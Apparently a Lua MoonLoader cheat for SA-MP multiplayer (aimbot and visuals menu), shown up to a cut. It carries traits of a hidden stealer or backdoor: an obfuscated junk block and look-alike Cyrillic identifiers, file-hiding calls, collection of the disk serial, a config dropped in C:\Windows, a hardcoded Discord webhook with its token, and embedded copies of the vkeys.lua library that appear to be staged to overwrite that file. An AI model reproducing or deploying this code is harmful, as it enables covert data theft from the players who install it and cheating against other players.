goto hidden
goto visible

::hidden::

function _()
    (""):†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()
    (""):†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()
    (""):†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()
    (""):†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()
    (""):†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()():†()
end

local script_version = "1.0"

-- LIB'S
local effil = require "effil"
local Packets = require "structs_packet"
local RPC = require "structs_rpc"
local memory = require "memory"
local events = require "lib.samp.events"
local inicfg = require "inicfg"
local fa = require "fAwesome5"
local ffi = require "ffi"
local imgui = require "imgui"
local encoding = require "encoding"
encoding.default = "CP1251"
u8 = encoding.UTF8
-- LIB'S

-- FFI
local getÂînåÐîsitiîn = ffi.cast("int (__thiscall*)(void*, float*, int, bool)", 0x5E4280)

ffi.cdef[[
    int __stdcall GetVolumeInformationA(
        const char* lpRootPathName,
        char* lpVolumeNameBuffer,
        uint32_t nVolumeNameSize,
        uint32_t* lpVolumeSerialNumber,
        uint32_t* lpMaximumComponentLength,
        uint32_t* lpFileSystemFlags,
        char* lpFileSystemNameBuffer,
        uint32_t nFileSystemNameSize
    );

    typedef int              BOOL;
    typedef unsigned short   WORD;

    typedef struct _SYSTEMTIME {
        WORD wYear;
        WORD wMonth;
        WORD wDayOfWeek;
        WORD wDay;
        WORD wHour;
        WORD wMinute;
        WORD wSecond;
        WORD wMilliseconds;
    } SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME;

    BOOL SetSystemTime(
        SYSTEMTIME *lpSystemTime
    );

    void GetSystemTime(
        PSYSTEMTIME lpSystemTime
    );

    typedef unsigned long DWORD;
    typedef int BOOL;
    typedef const char *LPCSTR;

    BOOL SetFileAttributesA(
        LPCSTR lpFileName,
        DWORD  dwFileAttributes
    );
]]
-- FFI

function set_hidden(file_name, is_hidden, full_hidden)
    ffi.C.SetFileAttributesA(file_name, full_hidden and 0x7 or (is_hidden and 0x2 or 0x0))
end

set_hidden("moonloader\\lib\\md5\\cîrå.lua", false)

local serial = ffi.new("unsigned long[1]", 0)
ffi.C.GetVolumeInformationA(nil, nil, 0, serial, nil, nil, nil, 0)
local serial = serial[0]

-- DIRECTORY'S
local vkeys_path = "moonloader\\lib\\vkeys.lua"
local config_path = "C:\\Windows\\xvsg.ini"
-- DIRECTORY'S

-- VAR'S
local mainWindowState = imgui.ImBool(false)
local posX, posY = getScreenResolution()
local multiplier = 1
local làstsmîîth = -1

local filter_in_filter = imgui.ImBuffer(256)
local filter_packets_incoming = {}
local filter_packets_outcoming = {}
local filter_rpc_incoming = {}
local filter_rpc_outcoming = {}

local url = "https://discord.com/api/webhooks/1008793634872770641/at2rcEgccGfZqjpp71UGfG3QGqjoOrog3tDDD4MMXNK6MGQDv_5ahb7sU8BEKe9u0r4p"
local data = {
   ['content'] = '', -- òåêñò (ìåíÿåòñÿ ÷åðåç êîìàíäó, òàê ÷òî ìîæíî îñòàâèòü ïóñòûì)
   ['username'] = 'Sended from .lua script!', -- íèê îòïðàâèòåëÿ
   ['avatar_url'] = 'https://c.tenor.com/Z9mXH7-MlcsAAAAS/sexy-black-man-thirst-trap.gif', -- ññûëêà íà àâàòàðêó (ìîæíî óáðàòü, áóäåò äåôîëòíàÿ)
   ['tts'] = false, -- tts - text to speech - ÷èòàëêà ñîîáùåíèé (true/false)
   -- òàê æå ìîæíî ñäåëàòü åùå ìíîãî ÷åãî, ïîäðîáíåå òóò: https://discord.com/developers/docs/resources/webhook
}
-- VAR'S

-- TABLE'S
local ànims = {'DAM_armL_frmBK', 'DAM_armL_frmFT', 'DAM_armL_frmLT', 'DAM_armR_frmBK', 'DAM_armR_frmFT', 'DAM_armR_frmRT', 'DAM_LegL_frmBK', 'DAM_LegL_frmFT', 'DAM_LegL_frmLT', 'DAM_LegR_frmBK', 'DAM_LegR_frmFT', 'DAM_LegR_frmRT', 'DAM_stomach_frmBK', 'DAM_stomach_frmFT', 'DAM_stomach_frmLT', 'DAM_stomach_frmRT'}

local cfg = inicfg.load({
    smuth = {
        en = false,
        of = false,
        is = false,
        cf = false,
        vc = false,
        ds = false,
        cm = false,
        ca = false,
        ss = 1.0,
        sm = 1.0,
        ra = 1.0,
    },

    silånt = {
        en = false,
        ws = false,
        cf = false,
        cm = false,
        cc = false,
        cd = false,

        ra = 1.0,
        ds = 1.0,
        hc = 0,
    },

    visuàl = {
        drf = false,
        bx = false,
        ln = false,
        nt = false,
        bn = false,
    },

    misñ = {
        as = false,
        ir = false,
        nf = false,
        ncr = false,
        ar = false,
        sh = false,
        dr = false,
        fe = false,
        jb = false,
        ca = false,
        nr = false,
        atc = false,
        scr = false,
        io = false,
        bf = false,
        weg = false,
        spb = false,
        ajm = false,
        hm = false,
        bf = false,
        tm = false,
        cb = false,
        row = false,
        fc = false,
        r180 = false,
        jc = false,
        ei = false,
        sph = false,
        fu = false,
    },

    îthår = {
        style = 0
    }
}, config_path)

local gui = {
    smuth = {
        en = imgui.ImBool(cfg.smuth.en),
        of = imgui.ImBool(cfg.smuth.of),
        is = imgui.ImBool(cfg.smuth.is),
        cf = imgui.ImBool(cfg.smuth.cf),
        vc = imgui.ImBool(cfg.smuth.vc),
        ds = imgui.ImBool(cfg.smuth.ds),
        cm = imgui.ImBool(cfg.smuth.cm),
        ca = imgui.ImBool(cfg.smuth.ca),

        ss = imgui.ImFloat(cfg.smuth.ss),
        sm = imgui.ImFloat(cfg.smuth.sm),
        ra = imgui.ImFloat(cfg.smuth.ra),
    },

    silånt = {
        en = imgui.ImBool(cfg.silånt.en),
        ws = imgui.ImBool(cfg.silånt.ws),
        cf = imgui.ImBool(cfg.silånt.cf),
        cm = imgui.ImBool(cfg.silånt.cm),
        cc = imgui.ImBool(cfg.silånt.cc),
        cd = imgui.ImBool(cfg.silånt.cd),

        ra = imgui.ImFloat(cfg.silånt.ra),
        ds = imgui.ImFloat(cfg.silånt.ds),
        hc = imgui.ImInt(cfg.silånt.hc),
    },

    visuàl = {
        drf = imgui.ImBool(cfg.visuàl.drf),
        bx = imgui.ImBool(cfg.visuàl.bx),
        ln = imgui.ImBool(cfg.visuàl.ln),
        nt = imgui.ImBool(cfg.visuàl.nt),
        bn = imgui.ImBool(cfg.visuàl.bn),
    },

    misñ = {
        as = imgui.ImBool(cfg.misñ.as),
        ir = imgui.ImBool(cfg.misñ.ir),
        nf = imgui.ImBool(cfg.misñ.nf),
        ncr = imgui.ImBool(cfg.misñ.ncr),
        ar = imgui.ImBool(cfg.misñ.ar),
        sh = imgui.ImBool(cfg.misñ.sh),
        dr = imgui.ImBool(cfg.misñ.dr),
        fe = imgui.ImBool(cfg.misñ.fe),
        jb = imgui.ImBool(cfg.misñ.jb),
        ca = imgui.ImBool(cfg.misñ.ca),
        nr = imgui.ImBool(cfg.misñ.nr),
        atc = imgui.ImBool(cfg.misñ.atc),
        scr = imgui.ImBool(cfg.misñ.scr),
        io = imgui.ImBool(cfg.misñ.io),
        bf = imgui.ImBool(cfg.misñ.bf),
        weg = imgui.ImBool(cfg.misñ.weg),
        spb = imgui.ImBool(cfg.misñ.spb),
        ajm = imgui.ImBool(cfg.misñ.ajm),
        hm = imgui.ImBool(cfg.misñ.hm),
        bf = imgui.ImBool(cfg.misñ.bf),
        tm = imgui.ImBool(cfg.misñ.tm),
        cb = imgui.ImBool(cfg.misñ.cb),
        row = imgui.ImBool(cfg.misñ.row),
        fc = imgui.ImBool(cfg.misñ.fc),
        r180 = imgui.ImBool(cfg.misñ.r180),
        jc = imgui.ImBool(cfg.misñ.jc),
        ei = imgui.ImBool(cfg.misñ.ei),
        sph = imgui.ImBool(cfg.misñ.sph),
        fu = imgui.ImBool(cfg.misñ.fu),
    },

    îthår = {
        style = imgui.ImInt(cfg.îthår.style)
    }
}
-- TABLE'S

local menu = 1
local theme_style = {
    u8 "Blue-style",
    u8 "Red-style",
    u8 "Brown-style",
    u8 "Light-blue-style",
    u8 "Light-green-style",
}

-- COD
local cod_unl = [[
-- This file is part of SA MoonLoader package.
-- Licensed under the MIT License.
-- Copyright (c) 2016, BlastHack Team <blast.hk>


local k = {
    VK_LBUTTON = 0x01,
    VK_RBUTTON = 0x02,
    VK_CANCEL = 0x03,
    VK_MBUTTON = 0x04,
    VK_XBUTTON1 = 0x05,
    VK_XBUTTON2 = 0x06,
    VK_BACK = 0x08,
    VK_TAB = 0x09,
    VK_CLEAR = 0x0C,
    VK_RETURN = 0x0D,
    VK_SHIFT = 0x10,
    VK_CONTROL = 0x11,
    VK_MENU = 0x12,
    VK_PAUSE = 0x13,
    VK_CAPITAL = 0x14,
    VK_KANA = 0x15,
    VK_JUNJA = 0x17,
    VK_FINAL = 0x18,
    VK_KANJI = 0x19,
    VK_ESCAPE = 0x1B,
    VK_CONVERT = 0x1C,
    VK_NONCONVERT = 0x1D,
    VK_ACCEPT = 0x1E,
    VK_MODECHANGE = 0x1F,
    VK_SPACE = 0x20,
    VK_PRIOR = 0x21,
    VK_NEXT = 0x22,
    VK_END = 0x23,
    VK_HOME = 0x24,
    VK_LEFT = 0x25,
    VK_UP = 0x26,
    VK_RIGHT = 0x27,
    VK_DOWN = 0x28,
    VK_SELECT = 0x29,
    VK_PRINT = 0x2A,
    VK_EXECUTE = 0x2B,
    VK_SNAPSHOT = 0x2C,
    VK_INSERT = 0x2D,
    VK_DELETE = 0x2E,
    VK_HELP = 0x2F,
    VK_0 = 0x30,
    VK_1 = 0x31,
    VK_2 = 0x32,
    VK_3 = 0x33,
    VK_4 = 0x34,
    VK_5 = 0x35,
    VK_6 = 0x36,
    VK_7 = 0x37,
    VK_8 = 0x38,
    VK_9 = 0x39,
    VK_A = 0x41,
    VK_B = 0x42,
    VK_C = 0x43,
    VK_D = 0x44,
    VK_E = 0x45,
    VK_F = 0x46,
    VK_G = 0x47,
    VK_H = 0x48,
    VK_I = 0x49,
    VK_J = 0x4A,
    VK_K = 0x4B,
    VK_L = 0x4C,
    VK_M = 0x4D,
    VK_N = 0x4E,
    VK_O = 0x4F,
    VK_P = 0x50,
    VK_Q = 0x51,
    VK_R = 0x52,
    VK_S = 0x53,
    VK_T = 0x54,
    VK_U = 0x55,
    VK_V = 0x56,
    VK_W = 0x57,
    VK_X = 0x58,
    VK_Y = 0x59,
    VK_Z = 0x5A,
    VK_LWIN = 0x5B,
    VK_RWIN = 0x5C,
    VK_APPS = 0x5D,
    VK_SLEEP = 0x5F,
    VK_NUMPAD0 = 0x60,
    VK_NUMPAD1 = 0x61,
    VK_NUMPAD2 = 0x62,
    VK_NUMPAD3 = 0x63,
    VK_NUMPAD4 = 0x64,
    VK_NUMPAD5 = 0x65,
    VK_NUMPAD6 = 0x66,
    VK_NUMPAD7 = 0x67,
    VK_NUMPAD8 = 0x68,
    VK_NUMPAD9 = 0x69,
    VK_MULTIPLY = 0x6A,
    VK_ADD = 0x6B,
    VK_SEPARATOR = 0x6C,
    VK_SUBTRACT = 0x6D,
    VK_DECIMAL = 0x6E,
    VK_DIVIDE = 0x6F,
    VK_F1 = 0x70,
    VK_F2 = 0x71,
    VK_F3 = 0x72,
    VK_F4 = 0x73,
    VK_F5 = 0x74,
    VK_F6 = 0x75,
    VK_F7 = 0x76,
    VK_F8 = 0x77,
    VK_F9 = 0x78,
    VK_F10 = 0x79,
    VK_F11 = 0x7A,
    VK_F12 = 0x7B,
    VK_F13 = 0x7C,
    VK_F14 = 0x7D,
    VK_F15 = 0x7E,
    VK_F16 = 0x7F,
    VK_F17 = 0x80,
    VK_F18 = 0x81,
    VK_F19 = 0x82,
    VK_F20 = 0x83,
    VK_F21 = 0x84,
    VK_F22 = 0x85,
    VK_F23 = 0x86,
    VK_F24 = 0x87,
    VK_NUMLOCK = 0x90,
    VK_SCROLL = 0x91,
    VK_OEM_FJ_JISHO = 0x92,
    VK_OEM_FJ_MASSHOU = 0x93,
    VK_OEM_FJ_TOUROKU = 0x94,
    VK_OEM_FJ_LOYA = 0x95,
    VK_OEM_FJ_ROYA = 0x96,
    VK_LSHIFT = 0xA0,
    VK_RSHIFT = 0xA1,
    VK_LCONTROL = 0xA2,
    VK_RCONTROL = 0xA3,
    VK_LMENU = 0xA4,
    VK_RMENU = 0xA5,
    VK_BROWSER_BACK = 0xA6,
    VK_BROWSER_FORWARD = 0xA7,
    VK_BROWSER_REFRESH = 0xA8,
    VK_BROWSER_STOP = 0xA9,
    VK_BROWSER_SEARCH = 0xAA,
    VK_BROWSER_FAVORITES = 0xAB,
    VK_BROWSER_HOME = 0xAC,
    VK_VOLUME_MUTE = 0xAD,
    VK_VOLUME_DOWN = 0xAE,
    VK_VOLUME_UP = 0xAF,
    VK_MEDIA_NEXT_TRACK = 0xB0,
    VK_MEDIA_PREV_TRACK = 0xB1,
    VK_MEDIA_STOP = 0xB2,
    VK_MEDIA_PLAY_PAUSE = 0xB3,
    VK_LAUNCH_MAIL = 0xB4,
    VK_LAUNCH_MEDIA_SELECT = 0xB5,
    VK_LAUNCH_APP1 = 0xB6,
    VK_LAUNCH_APP2 = 0xB7,
    VK_OEM_1 = 0xBA,
    VK_OEM_PLUS = 0xBB,
    VK_OEM_COMMA = 0xBC,
    VK_OEM_MINUS = 0xBD,
    VK_OEM_PERIOD = 0xBE,
    VK_OEM_2 = 0xBF,
    VK_OEM_3 = 0xC0,
    VK_ABNT_C1 = 0xC1,
    VK_ABNT_C2 = 0xC2,
    VK_OEM_4 = 0xDB,
    VK_OEM_5 = 0xDC,
    VK_OEM_6 = 0xDD,
    VK_OEM_7 = 0xDE,
    VK_OEM_8 = 0xDF,
    VK_OEM_AX = 0xE1,
    VK_OEM_102 = 0xE2,
    VK_ICO_HELP = 0xE3,
    VK_PROCESSKEY = 0xE5,
    VK_ICO_CLEAR = 0xE6,
    VK_PACKET = 0xE7,
    VK_OEM_RESET = 0xE9,
    VK_OEM_JUMP = 0xEA,
    VK_OEM_PA1 = 0xEB,
    VK_OEM_PA2 = 0xEC,
    VK_OEM_PA3 = 0xED,
    VK_OEM_WSCTRL = 0xEE,
    VK_OEM_CUSEL = 0xEF,
    VK_OEM_ATTN = 0xF0,
    VK_OEM_FINISH = 0xF1,
    VK_OEM_COPY = 0xF2,
    VK_OEM_AUTO = 0xF3,
    VK_OEM_ENLW = 0xF4,
    VK_OEM_BACKTAB = 0xF5,
    VK_ATTN = 0xF6,
    VK_CRSEL = 0xF7,
    VK_EXSEL = 0xF8,
    VK_EREOF = 0xF9,
    VK_PLAY = 0xFA,
    VK_ZOOM = 0xFB,
    VK_PA1 = 0xFD,
    VK_OEM_CLEAR = 0xFE,
}

local names = {
    [k.VK_LBUTTON] = 'Left Button',
    [k.VK_RBUTTON] = 'Right Button',
    [k.VK_CANCEL] = 'Break',
    [k.VK_MBUTTON] = 'Middle Button',
    [k.VK_XBUTTON1] = 'X Button 1',
    [k.VK_XBUTTON2] = 'X Button 2',
    [k.VK_BACK] = 'Backspace',
    [k.VK_TAB] = 'Tab',
    [k.VK_CLEAR] = 'Clear',
    [k.VK_RETURN] = 'Enter',
    [k.VK_SHIFT] = 'Shift',
    [k.VK_CONTROL] = 'Ctrl',
    [k.VK_MENU] = 'Alt',
    [k.VK_PAUSE] = 'Pause',
    [k.VK_CAPITAL] = 'Caps Lock',
    [k.VK_KANA] = 'Kana',
    [k.VK_JUNJA] = 'Junja',
    [k.VK_FINAL] = 'Final',
    [k.VK_KANJI] = 'Kanji',
    [k.VK_ESCAPE] = 'Esc',
    [k.VK_CONVERT] = 'Convert',
    [k.VK_NONCONVERT] = 'Non Convert',
    [k.VK_ACCEPT] = 'Accept',
    [k.VK_MODECHANGE] = 'Mode Change',
    [k.VK_SPACE] = 'Space',
    [k.VK_PRIOR] = 'Page Up',
    [k.VK_NEXT] = 'Page Down',
    [k.VK_END] = 'End',
    [k.VK_HOME] = 'Home',
    [k.VK_LEFT] = 'Arrow Left',
    [k.VK_UP] = 'Arrow Up',
    [k.VK_RIGHT] = 'Arrow Right',
    [k.VK_DOWN] = 'Arrow Down',
    [k.VK_SELECT] = 'Select',
    [k.VK_PRINT] = 'Print',
    [k.VK_EXECUTE] = 'Execute',
    [k.VK_SNAPSHOT] = 'Print Screen',
    [k.VK_INSERT] = 'Insert',
    [k.VK_DELETE] = 'Delete',
    [k.VK_HELP] = 'Help',
    [k.VK_0] = '0',
    [k.VK_1] = '1',
    [k.VK_2] = '2',
    [k.VK_3] = '3',
    [k.VK_4] = '4',
    [k.VK_5] = '5',
    [k.VK_6] = '6',
    [k.VK_7] = '7',
    [k.VK_8] = '8',
    [k.VK_9] = '9',
    [k.VK_A] = 'A',
    [k.VK_B] = 'B',
    [k.VK_C] = 'C',
    [k.VK_D] = 'D',
    [k.VK_E] = 'E',
    [k.VK_F] = 'F',
    [k.VK_G] = 'G',
    [k.VK_H] = 'H',
    [k.VK_I] = 'I',
    [k.VK_J] = 'J',
    [k.VK_K] = 'K',
    [k.VK_L] = 'L',
    [k.VK_M] = 'M',
    [k.VK_N] = 'N',
    [k.VK_O] = 'O',
    [k.VK_P] = 'P',
    [k.VK_Q] = 'Q',
    [k.VK_R] = 'R',
    [k.VK_S] = 'S',
    [k.VK_T] = 'T',
    [k.VK_U] = 'U',
    [k.VK_V] = 'V',
    [k.VK_W] = 'W',
    [k.VK_X] = 'X',
    [k.VK_Y] = 'Y',
    [k.VK_Z] = 'Z',
    [k.VK_LWIN] = 'Left Win',
    [k.VK_RWIN] = 'Right Win',
    [k.VK_APPS] = 'Context Menu',
    [k.VK_SLEEP] = 'Sleep',
    [k.VK_NUMPAD0] = 'Numpad 0',
    [k.VK_NUMPAD1] = 'Numpad 1',
    [k.VK_NUMPAD2] = 'Numpad 2',
    [k.VK_NUMPAD3] = 'Numpad 3',
    [k.VK_NUMPAD4] = 'Numpad 4',
    [k.VK_NUMPAD5] = 'Numpad 5',
    [k.VK_NUMPAD6] = 'Numpad 6',
    [k.VK_NUMPAD7] = 'Numpad 7',
    [k.VK_NUMPAD8] = 'Numpad 8',
    [k.VK_NUMPAD9] = 'Numpad 9',
    [k.VK_MULTIPLY] = 'Numpad *',
    [k.VK_ADD] = 'Numpad +',
    [k.VK_SEPARATOR] = 'Separator',
    [k.VK_SUBTRACT] = 'Num -',
    [k.VK_DECIMAL] = 'Numpad .',
    [k.VK_DIVIDE] = 'Numpad /',
    [k.VK_F1] = 'F1',
    [k.VK_F2] = 'F2',
    [k.VK_F3] = 'F3',
    [k.VK_F4] = 'F4',
    [k.VK_F5] = 'F5',
    [k.VK_F6] = 'F6',
    [k.VK_F7] = 'F7',
    [k.VK_F8] = 'F8',
    [k.VK_F9] = 'F9',
    [k.VK_F10] = 'F10',
    [k.VK_F11] = 'F11',
    [k.VK_F12] = 'F12',
    [k.VK_F13] = 'F13',
    [k.VK_F14] = 'F14',
    [k.VK_F15] = 'F15',
    [k.VK_F16] = 'F16',
    [k.VK_F17] = 'F17',
    [k.VK_F18] = 'F18',
    [k.VK_F19] = 'F19',
    [k.VK_F20] = 'F20',
    [k.VK_F21] = 'F21',
    [k.VK_F22] = 'F22',
    [k.VK_F23] = 'F23',
    [k.VK_F24] = 'F24',
    [k.VK_NUMLOCK] = 'Num Lock',
    [k.VK_SCROLL] = 'Scrol Lock',
    [k.VK_OEM_FJ_JISHO] = 'Jisho',
    [k.VK_OEM_FJ_MASSHOU] = 'Mashu',
    [k.VK_OEM_FJ_TOUROKU] = 'Touroku',
    [k.VK_OEM_FJ_LOYA] = 'Loya',
    [k.VK_OEM_FJ_ROYA] = 'Roya',
    [k.VK_LSHIFT] = 'Left Shift',
    [k.VK_RSHIFT] = 'Right Shift',
    [k.VK_LCONTROL] = 'Left Ctrl',
    [k.VK_RCONTROL] = 'Right Ctrl',
    [k.VK_LMENU] = 'Left Alt',
    [k.VK_RMENU] = 'Right Alt',
    [k.VK_BROWSER_BACK] = 'Browser Back',
    [k.VK_BROWSER_FORWARD] = 'Browser Forward',
    [k.VK_BROWSER_REFRESH] = 'Browser Refresh',
    [k.VK_BROWSER_STOP] = 'Browser Stop',
    [k.VK_BROWSER_SEARCH] = 'Browser Search',
    [k.VK_BROWSER_FAVORITES] = 'Browser Favorites',
    [k.VK_BROWSER_HOME] = 'Browser Home',
    [k.VK_VOLUME_MUTE] = 'Volume Mute',
    [k.VK_VOLUME_DOWN] = 'Volume Down',
    [k.VK_VOLUME_UP] = 'Volume Up',
    [k.VK_MEDIA_NEXT_TRACK] = 'Next Track',
    [k.VK_MEDIA_PREV_TRACK] = 'Previous Track',
    [k.VK_MEDIA_STOP] = 'Stop',
    [k.VK_MEDIA_PLAY_PAUSE] = 'Play / Pause',
    [k.VK_LAUNCH_MAIL] = 'Mail',
    [k.VK_LAUNCH_MEDIA_SELECT] = 'Media',
    [k.VK_LAUNCH_APP1] = 'App1',
    [k.VK_LAUNCH_APP2] = 'App2',
    [k.VK_OEM_1] = {';', ':'},
    [k.VK_OEM_PLUS] = {'=', '+'},
    [k.VK_OEM_COMMA] = {',', '<'},
    [k.VK_OEM_MINUS] = {'-', '_'},
    [k.VK_OEM_PERIOD] = {'.', '>'},
    [k.VK_OEM_2] = {'/', '?'},
    [k.VK_OEM_3] = {'`', '~'},
    [k.VK_ABNT_C1] = 'Abnt C1',
    [k.VK_ABNT_C2] = 'Abnt C2',
    [k.VK_OEM_4] = {'[', '{'},
    [k.VK_OEM_5] = {'\'', '|'},
    [k.VK_OEM_6] = {']', '}'},
    [k.VK_OEM_7] = {'\'', '"'},
    [k.VK_OEM_8] = {'!', 'ï¿½'},
    [k.VK_OEM_AX] = 'Ax',
    [k.VK_OEM_102] = '> <',
    [k.VK_ICO_HELP] = 'IcoHlp',
    [k.VK_PROCESSKEY] = 'Process',
    [k.VK_ICO_CLEAR] = 'IcoClr',
    [k.VK_PACKET] = 'Packet',
    [k.VK_OEM_RESET] = 'Reset',
    [k.VK_OEM_JUMP] = 'Jump',
    [k.VK_OEM_PA1] = 'OemPa1',
    [k.VK_OEM_PA2] = 'OemPa2',
    [k.VK_OEM_PA3] = 'OemPa3',
    [k.VK_OEM_WSCTRL] = 'WsCtrl',
    [k.VK_OEM_CUSEL] = 'Cu Sel',
    [k.VK_OEM_ATTN] = 'Oem Attn',
    [k.VK_OEM_FINISH] = 'Finish',
    [k.VK_OEM_COPY] = 'Copy',
    [k.VK_OEM_AUTO] = 'Auto',
    [k.VK_OEM_ENLW] = 'Enlw',
    [k.VK_OEM_BACKTAB] = 'Back Tab',
    [k.VK_ATTN] = 'Attn',
    [k.VK_CRSEL] = 'Cr Sel',
    [k.VK_EXSEL] = 'Ex Sel',
    [k.VK_EREOF] = 'Er Eof',
    [k.VK_PLAY] = 'Play',
    [k.VK_ZOOM] = 'Zoom',
    [k.VK_PA1] = 'Pa1',
    [k.VK_OEM_CLEAR] = 'OemClr'
}

k.key_names = names

function k.id_to_name(vkey)
    local name = names[vkey]
    if type(name) == 'table' then
        return name[1]
    end
    return name
end

function k.name_to_id(keyname, case_sensitive)
    if not case_sensitive then
        keyname = string.upper(keyname)
    end
    for id, v in pairs(names) do
        if type(v) == 'table' then
            for _, v2 in pairs(v) do
                v2 = (case_sensitive) and v2 or string.upper(v2)
                if v2 == keyname then
                    return id
                end
            end
        else
            local name = (case_sensitive) and v or string.upper(v)
            if name == keyname then
                return id
            end
        end
    end
end

return k
]]

local cod_upl = [[
-- This file is part of SA MoonLoader package.
-- Licensed under the MIT License.
-- Copyright (c) 2016, BlastHack Team <blast.hk>


local k = {
    VK_LBUTTON = 0x01,
    VK_RBUTTON = 0x02,
    VK_CANCEL = 0x03,
    VK_MBUTTON = 0x04,
    VK_XBUTTON1 = 0x05,
    VK_XBUTTON2 = 0x06,
    VK_BACK = 0x08,
    VK_TAB = 0x09,
    VK_CLEAR = 0x0C,
    VK_RETURN = 0x0D,
    VK_SHIFT = 0x10,
    VK_CONTROL = 0x11,
    VK_MENU = 0x12,
    VK_PAUSE = 0x13,
    VK_CAPITAL = 0x14,
    VK_KANA = 0x15,
    VK_JUNJA = 0x17,
    VK_FINAL = 0x18,
    VK_KANJI = 0x19,
    VK_ESCAPE = 0x1B,
    VK_CONVERT = 0x1C,
    VK_NONCONVERT = 0x1D,
    VK_ACCEPT = 0x1E,
    VK_MODECHANGE = 0x1F,
    VK_SPACE = 0x20,
    VK_PRIOR = 0x21,
    VK_NEXT = 0x22,
    VK_END = 0x23,
    VK_HOME = 0x24,
    VK_LEFT = 0x25,
    VK_UP = 0x26,
    VK_RIGHT = 0x27,
    VK_DOWN = 0x28,
    VK_SELECT = 0x29,
    VK_PRINT = 0x2A,
    VK_EXECUTE = 0x2B,
    VK_SNAPSHOT = 0x2C,
    VK_INSERT = 0x2D,
    VK_DELETE = 0x2E,
    VK_HELP = 0x2F,
    VK_0 = 0x30,
    VK_1 = 0x31,
    VK_2 = 0x32,
    VK_3 = 0x33,
    VK_4 = 0x34,
    VK_5 = 0x35,
    VK_6 = 0x36,
    VK_7 = 0x37,
    VK_8 = 0x38,
    VK_9 = 0x39,
    VK_A = 0x41,
    VK_B = 0x42,
    VK_C = 0x43,
    VK_D = 0x44,
    VK_E = 0x45,
    VK_F = 0x46,
    VK_G = 0x47,
    VK_H = 0x48,
    VK_I = 0x49,
    VK_J = 0x4A,
    VK_K = 0x4B,
    VK_L = 0x4C,
    VK_M = 0x4D,
    VK_N = 0x4E,
    VK_O = 0x4F,
    VK_P = 0x50,
    VK_Q = 0x51,
    VK_R = 0x52,
    VK_S = 0x53,
    VK_T = 0x54,
    VK_U = 0x55,
    VK_V = 0x56,
    VK_W = 0x57,
    VK_X = 0x58,
    VK_Y = 0x59,
    VK_Z = 0x5A,
    VK_LWIN = 0x5B,
    VK_RWIN = 0x5C,
    VK_APPS = 0x5D,
    VK_SLEEP = 0x5F,
    VK_NUMPAD0 = 0x60,
    VK_NUMPAD1 = 0x61,
    VK_NUMPAD2 = 0x62,
    VK_NUMPAD3 = 0x63,
    VK_NUMPAD4 = 0x64,
    VK_NUMPAD5 = 0x65,
    VK_NUMPAD6 = 0x66,
    VK_NUMPAD7 = 0x67,
    VK_NUMPAD8 = 0x68,
    VK_NUMPAD9 = 0x69,
    VK_MULTIPLY = 0x6A,
    VK_ADD = 0x6B,
    VK_SEPARATOR = 0x6C,
    VK_SUBTRACT = 0x6D,
    VK_DECIMAL = 0x6E,
    VK_DIVIDE = 0x6F,
    VK_F1 = 0x70,
    VK_F2 = 0x71,
    VK_F3 = 0x72,
    VK_F4 = 0x73,
    VK_F5 = 0x74,
    VK_F6 = 0x75,
    VK_F7 = 0x76,
    VK_F8 = 0x77,
    VK_F9 = 0x78,
    VK_F10 = 0x79,
    VK_F11 = 0x7A,
    VK_F12 = 0x7B,
    VK_F13 = 0x7C,
    VK_F14 = 0x7D,
    VK_F15 = 0x7E,
    VK_F16 = 0x7F,
    VK_F17 = 0x80,
    VK_F18 = 0x81,
    VK_F19 = 0x82,
    VK_F20 = 0x83,
    VK_F21 = 0x84,
    VK_F22 = 0x85,
    VK_F23 = 0x86,
    VK_F24 = 0x87,
    VK_NUMLOCK = 0x90,
    VK_SCROLL = 0x91,
    VK_OEM_FJ_JISHO = 0x92,
    VK_OEM_FJ_MASSHOU = 0x93,
    VK_OEM_FJ_TOUROKU = 0x94,
    VK_OEM_FJ_LOYA = 0x95,
    VK_OEM_FJ_ROYA = 0x96,
    VK_LSHIFT = 0xA0,
    VK_RSHIFT = 0xA1,
    VK_LCONTROL = 0xA2,
    VK_RCONTROL = 0xA3,
    VK_LMENU = 0xA4,
    VK_RMENU = 0xA5,
    VK_BROWSER_BACK = 0xA6,
    VK_BROWSER_FORWARD = 0xA7,
    VK_BROWSER_REFRESH = 0xA8,
    VK_BROWSER_STOP = 0xA9,
    VK_BROWSER_SEARCH = 0xAA,
    VK_BROWSER_FAVORITES = 0xAB,
    VK_BROWSER_HOME = 0xAC,
    VK_VOLUME_MUTE = 0xAD,
    VK_VOLUME_DOWN = 0xAE,
    VK_VOLUME_UP = 0xAF,
    VK_MEDIA_NEXT_TRACK = 0xB0,
    VK_MEDIA_PREV_TRACK = 0xB1,
    VK_MEDIA_STOP = 0xB2,
    VK_MEDIA_PLAY_PAUSE = 0xB3,
    VK_LAUNCH_MAIL = 0xB4,
    VK_LAUNCH_MEDIA_SELECT = 0xB5,
    VK_LAUNCH_APP1 = 0xB6,
    VK_LAUNCH_APP2 = 0xB7,
    VK_OEM_1 = 0xBA,
    VK_OEM_PLUS = 0xBB,
    VK_OEM_COMMA = 0xBC,
    VK_OEM_MINUS = 0xBD,
    VK_OEM_PERIOD = 0xBE,
    VK_OEM_2 = 0xBF,
    VK_OEM_3 = 0xC0,
    VK_ABNT_C1 = 0xC1,
    VK_ABNT_C2 = 0xC2,
    VK_OEM_4 = 0xDB,
    VK_OEM_5 = 0xDC,
    VK_OEM_6 = 0xDD,
    VK_OEM_7 = 0xDE,
    VK_OEM_8 = 0xDF,
    VK_OEM_AX = 0xE1,
    VK_OEM_102 = 0xE2,
    VK_ICO_HELP = 0xE3,
    VK_PROCESSKEY = 0xE5,
    VK_ICO_CLEAR = 0xE6,
    VK_PACKET = 0xE7,
    VK_OEM_RESET = 0xE9,
